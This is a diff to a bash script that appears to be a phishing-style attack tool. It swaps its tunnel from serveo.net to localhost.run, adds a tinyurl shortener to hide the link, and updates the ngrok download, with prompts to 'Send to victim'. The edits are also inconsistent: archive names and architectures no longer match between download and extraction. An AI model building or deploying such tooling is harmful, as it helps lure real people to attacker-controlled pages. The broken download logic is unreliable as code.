@@ -161,14 +161,14 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not instal
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' ssh.localhost.run 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 15
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link=$(grep -o "https://[^ ]*\.localhost\.run" sendlink)
 printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-printf '\n\e[1;92m✓\e[0m Direct link generated\n'
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Send to victim:\e[0m\e[1;77m %s \n' $send_link
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' "$send_link"
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Using urlshortner:\e[0m\e[1;77m %s \n' "$send_ip"
 printf "\n"
 checkfound
 
@@ -217,9 +217,9 @@ if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+tar xzf ngrok-v3-stable-linux-arm.tgz > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
+rm -rf ngrok-v3-stable-linux-arm.tgz
 else
 printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
@@ -228,7 +228,7 @@ fi
 
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -259,7 +259,7 @@ fi
 
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m localhost.run (SSH tunnel)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
